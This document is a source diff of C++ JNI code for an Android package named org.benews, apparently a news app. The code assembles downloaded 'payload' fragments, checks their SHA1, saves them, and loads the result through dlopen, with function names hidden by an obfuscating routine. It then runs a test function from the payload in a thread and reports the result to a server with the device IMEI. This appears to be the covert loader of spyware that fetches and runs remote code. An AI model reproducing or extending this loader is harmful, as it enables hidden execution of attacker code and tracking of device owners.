@@ -57,7 +57,6 @@ int file_exist(string file);
 string getFileName(string baseDir,int type,long int ts,int fragment);
 
 static pthread_mutex_t mux_running = {-1};
-pthread_t th;
 
 #define SPC_LIBRARY_TYPE           void *
 #define SPC_LOAD_LIBRARY(name)     dlopen((name), RTLD_LAZY);
@@ -141,27 +140,27 @@ void *file_op(enum file_op_enum op,string n) {
     case fileop_check:
       sub30(0x04050607, filename, sizeof(filename));
       sub30(0x01020803, &filename[4], sizeof(filename)-4);
-      if (!s.open) s.open = SPC_RESOLVE_SYM(lib, filename);
+      s.open = SPC_RESOLVE_SYM(lib, filename);
       return s.open;
     case fileop_close:
       sub30(0x01020407, filename, sizeof(filename));
       sub30(0x08090603, &filename[4], sizeof(filename)-4);
-      if (!s.close) s.close = SPC_RESOLVE_SYM(lib, filename);
+      s.close = SPC_RESOLVE_SYM(lib, filename);
       return s.close;
     case fileop_read:
       sub30(0x14d5a607, filename, sizeof(filename));
       sub30(0x0132a453, &filename[4], sizeof(filename)-4);
-      if (!s.read) s.read = SPC_RESOLVE_SYM(lib, filename);
+      s.read = SPC_RESOLVE_SYM(lib, filename);
       return s.read;
     case fileop_write:
       sub30(0x341f06e7, filename, sizeof(filename));
       sub30(0x7102aa8d3, &filename[4], sizeof(filename)-4);
-      if (!s.write) s.write = SPC_RESOLVE_SYM(lib,filename);
+      s.write = SPC_RESOLVE_SYM(lib,filename);
       return s.write;
     case fileop_seek:
       sub30(0xd4a506f5, filename, sizeof(filename));
       sub30(0xa112f822, &filename[4], sizeof(filename)-4);
-      if (!s.seek) s.seek = SPC_RESOLVE_SYM(lib, filename);
+      s.seek = SPC_RESOLVE_SYM(lib, filename);
       return s.seek;
   }
   }
@@ -351,7 +350,7 @@ string merge_fragment(string baseDir,int type,long int ts)
       {
         const char* tmp = i->path().string().c_str();
         const char* tmp_src=file_mask.c_str();
-        logd("checking %s --> %s",tmp,tmp_src);
+        //logd("checking %s --> %s",tmp,tmp_src);
         // Skip if not a file
 
         if( !regular_file( tmp ) ){
@@ -359,12 +358,12 @@ string merge_fragment(string baseDir,int type,long int ts)
           continue;
         }
 
-        logd("against  %s",tmp_src);
+        //logd("against  %s",tmp_src);
         // Skip if no match
         if(strlen(tmp)>=strlen(tmp_src)){
           if (strncmp(tmp,tmp_src,strlen(tmp_src)) == 0)
           {
-            logd("adding %s",tmp );
+            //logd("adding %s",tmp );
             all_matching_files.push_back( i->path().string());
           }
         }
@@ -483,14 +482,15 @@ void *run_checksum(void *arg) {
     string path = dir.string();
     path += "/";
     boost::filesystem::path old_dir = boost::filesystem::current_path();
-    logd("change path from %s to %s",old_dir.string().c_str(),path.c_str());
+    logd("change path from %s to %s [%p]",old_dir.string().c_str(),path.c_str(),arg);
     boost::filesystem::current_path(dir);
     if(test_fnc()){
       logd("deadbeef:");
-      retStatus=-2;
-    }else{
       retStatus= -1;
+    }else{
+      retStatus= -2;
     }
+    arg = NULL;
     pthread_mutex_unlock(&mux_running);
   }else{
     logd("cannotrun:");
@@ -500,7 +500,7 @@ void *run_checksum(void *arg) {
   return (void *)&retStatus;
 }
 
-
+pthread_t th;
 
 int isGood(string f,char * payload,int payload_size,file_signature* fs)
 {
@@ -525,6 +525,7 @@ int isGood(string f,char * payload,int payload_size,file_signature* fs)
           if(test_fnc!=NULL){
             //Start of part to be threaded
             runned_file = f;
+
             if(pthread_create(&th, NULL, run_checksum, (void*)test_fnc)){
               logd("failed to execute Thread:");
             }
@@ -615,66 +616,6 @@ void shift_file(string baseDir,int type, string src){
 
 }
 
-/*
- * saves the payload in the correct place and format
- *
- * returns: 1 in case of error
- * returns: 0 in case of success
- */
-
-jobject save_payload_type(string baseDir,int type,long int ts,int fragment,string title,string headline,string content,char* payload, int payload_size,JNIEnv *env)
-{
-  jobject hashMap=NULL;
-  string result_output;
-  logd("payload %p basedir.e?=%d payloadSize=%d",payload,baseDir.empty(),payload_size);
-  if(payload!=NULL && !baseDir.empty() && payload_size>0){
-    if(save_payload(type,getFileName(baseDir,type,ts,fragment),payload,payload_size)==0){
-      getFileName(baseDir,type,ts,fragment);
-    }
-    if(fragment==0){
-      result_output = merge_fragment(baseDir,type,ts);
-      int check =check_filebytype(result_output,type,payload,payload_size);
-      const jsize map_len = HASH_FIELDS;
-      const jclass mapClass = env->FindClass("java/util/HashMap");
-      const jmethodID init = env->GetMethodID(mapClass, "<init>", "(I)V");
-      const jmethodID put = env->GetMethodID(mapClass, "put","(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;");
-      hashMap = env->NewObject(mapClass, init, map_len);
-      std::stringstream ss;
-      ss << ts;
-      std::string ts = ss.str();
-      if(check==0){
-        logd("file ok");
-        if(mapClass != NULL) {
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_TYPE), env->NewStringUTF(getTypeDir(type).c_str()));
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_PATH), env->NewStringUTF(result_output.c_str()));
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_TITLE), env->NewStringUTF(title.c_str()));
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts.c_str()));
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_HEADLINE), env->NewStringUTF(headline.c_str()));
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CONTENT), env->NewStringUTF(content.c_str()));
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
-        }
-      }else {
-        if(check<0)
-        {
-          logd("file not ok -1");
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-1"));
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts.c_str()));
-        }else
-        {
-          if (check==3)
-          {
-            shift_file(baseDir,type,result_output);
-          }
-          logd("file not ok 0");
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts.c_str()));
-        }
-      }
-    }
-
-  }
-  return hashMap;
-}
 
 std::string sha1_to_string(const char *hash)
 {
@@ -684,7 +625,7 @@ std::string sha1_to_string(const char *hash)
 
   for (int i = 0; i < 20; i++)
   {
-    sprintf(ptr, "%02X", (unsigned char)*hash);
+    sprintf(ptr, "%02x", (unsigned char)*hash);
     ptr += 2;
     hash++;
   }
@@ -692,6 +633,100 @@ std::string sha1_to_string(const char *hash)
 
   return ret;
 }
+
+/*
+ * saves the payload in the correct place and format
+ *
+ * returns: 1 in case of error
+ * returns: 0 in case of success
+ */
+
+jobject save_payload_type(string baseDir,int type,long int ts,int fragment,string title,string headline,string content,char* payload, int payload_size,string sha1_str,JNIEnv *env)
+{
+  jobject hashMap=NULL;
+  string result_output;
+  logd("payload %p basedir.e?=%d payloadSize=%d",payload,baseDir.empty(),payload_size);
+  if(payload!=NULL && !baseDir.empty() && payload_size>0){
+    boost::uuids::detail::sha1 hasher;
+    boost::shared_array<unsigned int> digest;
+    hasher.process_bytes((const void*)payload, payload_size);
+    digest.reset(new unsigned int [5]);
+    char bin[20];
+
+    hasher.get_digest(reinterpret_cast<boost::uuids::detail::sha1::digest_type>(*digest.get()));
+    for(int i = 0; i < 5; ++i)
+    {
+      const char* tmp = reinterpret_cast<char*>(digest.get());
+      bin[i * 4    ] = tmp[i * 4 + 3];
+      bin[i * 4 + 1] = tmp[i * 4 + 2];
+      bin[i * 4 + 2] = tmp[i * 4 + 1];
+      bin[i * 4 + 3] = tmp[i * 4    ];
+    }
+    std::string hash_hex = sha1_to_string(bin);
+    const jsize map_len = HASH_FIELDS;
+    const jclass mapClass = env->FindClass("java/util/HashMap");
+    const jmethodID init = env->GetMethodID(mapClass, "<init>", "(I)V");
+    const jmethodID put = env->GetMethodID(mapClass, "put","(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;");
+    std::stringstream ss;
+    ss << ts;
+    std::string ts_string = ss.str();
+    hashMap = env->NewObject(mapClass, init, map_len);
+    if (strncmp(hash_hex.c_str(),sha1_str.c_str(),sizeof(bin)*2) != 0 )
+    {
+
+      logd("sha1 mismatch:\ngot_sha1=%s\nrec_sha1=%s",hash_hex.c_str(),sha1_str.c_str());
+      env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+      env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF(hash_hex.c_str()));
+    }else{
+      if(save_payload(type,getFileName(baseDir,type,ts,fragment),payload,payload_size)==0){
+        getFileName(baseDir,type,ts,fragment);
+      }
+      if(fragment==0){
+        result_output = merge_fragment(baseDir,type,ts);
+        int check =check_filebytype(result_output,type,payload,payload_size);
+
+        if(check==0){
+          logd("file ok");
+          if(mapClass != NULL) {
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_TYPE), env->NewStringUTF(getTypeDir(type).c_str()));
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_PATH), env->NewStringUTF(result_output.c_str()));
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_TITLE), env->NewStringUTF(title.c_str()));
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_HEADLINE), env->NewStringUTF(headline.c_str()));
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CONTENT), env->NewStringUTF(content.c_str()));
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
+          }
+        }else {
+          if(check<0)
+          {
+            logd("file not ok -1");
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-1"));
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+          }else
+          {
+            logd("file not ok 0");
+            if (check==3)
+            {
+              shift_file(baseDir,type,result_output);
+              env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
+            }else{
+              env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-1"));
+            }
+            env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+          }
+        }
+      }else{
+        logd("fragment ok 0");
+        env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+        env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
+
+      }
+    }
+
+  }
+  return hashMap;
+}
+
 
 void GetJStringContent(JNIEnv *AEnv, jstring AStr, std::string &ARes)
 {
@@ -724,8 +759,6 @@ void GetJStringContent(JNIEnv *AEnv, jstring AStr, std::string &ARes)
  */
 JNIEXPORT jobject JNICALL Java_org_benews_BsonBridge_serialize(JNIEnv *env, jclass obj, jstring basedir, jobject bson_s)
 {
-
-
 
   jobject resS;
   CheckMutex();
@@ -851,26 +884,8 @@ JNIEXPORT jobject JNICALL Java_org_benews_BsonBridge_serialize(JNIEnv *env, jcla
         logd("returning %s",res.c_str());
         int a;
         const char *payloadArray=payload.binData(a);
-        boost::uuids::detail::sha1 hasher;
-        boost::shared_array<unsigned int> digest;
-        hasher.process_bytes((const void*)payloadArray, a);
-        digest.reset(new unsigned int [5]);
-        char bin[20];
-
-        hasher.get_digest(reinterpret_cast<boost::uuids::detail::sha1::digest_type>(*digest.get()));
-        for(int i = 0; i < 5; ++i)
-        {
-          const char* tmp = reinterpret_cast<char*>(digest.get());
-          bin[i * 4    ] = tmp[i * 4 + 3];
-          bin[i * 4 + 1] = tmp[i * 4 + 2];
-          bin[i * 4 + 2] = tmp[i * 4 + 1];
-          bin[i * 4 + 3] = tmp[i * 4    ];
-        }
-
-        std::string hash_hex = sha1_to_string(bin);
-        logd("got content sha1=%s\n recived sha1=%s",hash_hex.c_str(),sha1_str.c_str());
-        resS=save_payload_type(basedir_str,type.Int(),ts.Long(),frag.Int(),
-            title_str,headline_str,content_str,(char *)payloadArray,a,env);
+          resS=save_payload_type(basedir_str,type.Int(),ts.Long(),frag.Int(),
+              title_str,headline_str,content_str,(char *)payloadArray,a,sha1_str,env);
       }
     }else{
       // env->ReleaseByteArrayElements(bson_s,arry, JNI_ABORT);
@@ -881,14 +896,14 @@ JNIEXPORT jobject JNICALL Java_org_benews_BsonBridge_serialize(JNIEnv *env, jcla
 }
 
 
-
-JNIEXPORT jbyteArray JNICALL Java_org_benews_BsonBridge_getToken(JNIEnv * env, jclass, jstring imei, jint ts, jint lts_status)
+JNIEXPORT jbyteArray JNICALL Java_org_benews_BsonBridge_getToken(JNIEnv * env, jclass, jstring imei, jlong ts, jstring lts_status)
 {
   bob bson;
-  string imei_str;
+  string imei_str,lts_status_str;
   CheckMutex();
   GetJStringContent(env,imei,imei_str);
-  logd("lts_status imei=%s ts=%d lts=%d",imei_str.c_str(),ts,lts_status);
+  GetJStringContent(env,lts_status,lts_status_str);
+  logd("lts_status imei=%s ts=%d lts=%s",imei_str.c_str(),ts,lts_status_str.c_str());
   bson.append("imei",imei_str.c_str());
 
   if(threadStarted){
@@ -901,19 +916,22 @@ JNIEXPORT jbyteArray JNICALL Java_org_benews_BsonBridge_getToken(JNIEnv * env, j
           }else{
             int* st = (int*)status;
             logd("Thread returns %d",*st);
+            string value = boost::lexical_cast<std::string>(*st);
+            bson.append("lts_status",value.c_str());
           }
           threadStarted=false;
           pthread_mutex_unlock(&mux_running);
-          bson.append("ts",ts);
         }else{
           logd("job not finished,");
-
+          string value = boost::lexical_cast<std::string>(-3);
+          //lts_status in realta' e' il checksum ritornato dalla serialize
+          bson.append("lts_status",value.c_str());
         }
   }else{
-    bson.append("ts",ts);
+    //lts_status in realta' e' il checksum ritornato dalla serialize
+      bson.append("lts_status",lts_status_str.c_str());
   }
-  bson.append("lts_status",lts_status);
-
+  bson.append("ts",ts);
   bo ret =bson.obj();
   jbyteArray arr = env->NewByteArray(ret.objsize());
   env->SetByteArrayRegion(arr,0,ret.objsize(), (jbyte*)ret.objdata());
